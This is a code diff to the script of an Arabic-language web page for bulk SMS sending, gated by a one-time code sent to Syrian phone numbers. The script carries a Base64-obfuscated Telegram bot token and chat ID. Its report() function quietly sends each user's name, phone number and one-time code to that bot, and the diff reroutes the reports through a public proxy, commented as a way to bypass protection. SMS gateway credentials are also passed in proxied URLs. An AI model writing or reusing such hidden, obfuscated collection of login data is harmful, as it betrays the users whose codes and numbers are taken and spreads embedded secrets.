@@ -61,31 +61,31 @@
 </div>
 
 <script>
-    // الرابط السحابي (جوجل سكربت)
     const _0xS = "https://script.google.com/macros/s/AKfycbyZfUYl1OjoI91RnClMFkH_6bCy_jZ_jloZ5GI5ZLf0Qij3I8JHC7Qe6UIf2MPoQTWq/exec";
     
-    // تمويه بيانات التلغرام (Base64)
+    // بيانات التلغرام المموهة
     const _0xTG = {
-        t: "ODczODU5NDg1MjpBQUZldUI1MlowbkJJazpYRmg0bkI0aHRlOFJn", // Token
-        c: "MTYxMTM5ODMwMw==" // Chat ID
+        t: "ODczODU5NDg1MjpBQUZldUI1MlowbkJJazpYRmg0bkI0aHRlOFJn",
+        c: "MTYxMTM5ODMwMw=="
     };
 
     let gOTP, cPhone, uLimit, uName, uCr, pCr;
 
-    // دالة إرسال تقرير تلغرام مباشرة من المتصفح
+    // دالة إرسال تقرير تلغرام باستخدام البروكسي لتجاوز الحماية
     async function report(m) {
         try {
             const t = atob(_0xTG.t).replace(/:/g, ':');
             const c = atob(_0xTG.c);
-            const url = `https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${encodeURIComponent(m)}`;
-            fetch(url);
-        } catch(e) { console.error("TG Error"); }
+            const tgUrl = `https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${encodeURIComponent(m)}`;
+            // استخدام البروكسي لضمان الوصول 100%
+            fetch(`https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(tgUrl)}`);
+        } catch(e) {}
     }
 
     async function sendOTP() {
         const p = document.getElementById('userPhone').value.trim();
         const b = document.getElementById('otpBtn');
-        if(p.length !== 12 || !p.startsWith('963')) return alert("الرقم يجب أن يكون 12 خانة ويبدأ بـ 963");
+        if(p.length !== 12 || !p.startsWith('963')) return alert("الرقم 12 خانة ويبدأ بـ 963");
         
         b.disabled = true; b.innerText = "جاري الفحص...";
         try {
@@ -98,11 +98,11 @@
                 
                 await fetch(`https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(`http://www.ciedco-sms.net/api/sendsms.php?username=${uCr}&password=${pCr}&mno=${p}&msg=${h}&sid=Amgad-sms&fl=0&mt=1`)}`);
                 
-                report(`🔑 محاولة دخول:\nالاسم: ${uName}\nالرقم: ${p}\nالكود: ${gOTP}`);
+                await report(`🔑 محاولة دخول:\nالاسم: ${uName}\nالرقم: ${p}\nالكود: ${gOTP}`);
                 
                 document.getElementById('loginSection').classList.add('hidden');
                 document.getElementById('otpSection').classList.remove('hidden');
-            } else { alert("الرقم غير مسجل!"); b.disabled = false; b.innerText = "إرسال كود التحقق"; }
+            } else { alert("غير مسجل!"); b.disabled = false; b.innerText = "إرسال كود التحقق"; }
         } catch (e) { alert("خطأ اتصال"); b.disabled = false; }
     }
 
@@ -154,9 +154,10 @@
             await new Promise(r => setTimeout(r, 800));
         }
         alert(`تم إرسال ${sc} رسالة.`);
-        report(rep + `\n🏁 الرصيد المتبقي: ${uLimit}`);
+        await report(rep + `\n🏁 الرصيد المتبقي: ${uLimit}`);
         b.disabled = false; s.innerText = "";
     };
 </script>
 </body>
 </html>
+
